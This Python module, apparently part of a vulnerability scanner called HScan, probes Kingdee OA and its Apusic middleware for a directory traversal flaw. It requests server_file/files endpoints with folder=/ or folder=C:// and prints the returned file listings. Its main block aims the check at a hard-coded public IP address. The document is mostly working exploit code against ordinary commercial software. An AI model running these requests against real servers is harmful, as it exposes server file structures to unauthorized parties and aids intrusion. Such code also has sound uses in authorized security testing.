'''
金蝶OA目录遍历
'''
import re

import requests

from HScan.main import print_blue, print_green, print_red, print_yellow


def jdOA_path(url, timeout=6):
    # print_blue('金蝶OA目录遍历')
    Windows_line = url.strip() + '/appmonitor/protected/selector/server_file/files?folder=C://&suffix='
    linux_line = url.strip() + '/appmonitor/protected/selector/server_file/files?folder=/&suffix='

    try:
        linux_data = requests.get(linux_line, timeout=timeout, verify=False)
        if linux_data.status_code == 200:
            lin = linux_data.text
            zheng = 'total'
            zheng_data = re.compile(zheng)
            zheng1 = zheng_data.search(lin).group()
            if zheng1 == 'total':
                print_green(f'金蝶OA目录遍历 ====> 存在漏洞 ====> {url}\n内容为:{linux_data.text}')
            if zheng1 != 'total':
                Windows_data = requests.get(Windows_line, timeout=timeout, verify=False)
                zheng_windows = Windows_data.text
                zheng2 = zheng_data.search(zheng_windows).group()
                if zheng2 == 'total':
                    print_green(f'金蝶OA目录遍历 ====> 存在漏洞 ====> {url}\n内容为:{Windows_data.text}')
                if zheng2 != 'total':
                    pass

        if linux_data.status_code != 200:
            Windows_data = requests.get(Windows_line, timeout=timeout, verify=False)
            if Windows_data.status_code == 200:
                print_green(f'金蝶OA目录遍历 ====> 存在漏洞 ====> {url}\n内容为:{linux_data.text}')
            if Windows_data.status_code != 200:
                print_yellow(f'金蝶OA目录遍历 状态码{Windows_data.status_code}')
                pass
    except requests.exceptions.ConnectionError:
        print_red('金蝶OA目录遍历')
        pass

    except Exception as e:
        print_red('金蝶OA目录遍历')



def jdOA_path_Apusic(url, timeout=6):
    print_blue('金蝶OA中间件Apusic目录遍历')
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    try:
        re = requests.get(url + '/admin/protected/selector/server_file/files?folder=/', timeout=timeout,verify=False)
        # print(re)
        if 'total' in re.text:
            return '成功'
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未知错误：' + str(e)


if __name__ == '__main__':
    jdOA_path('http://47.103.27.56/')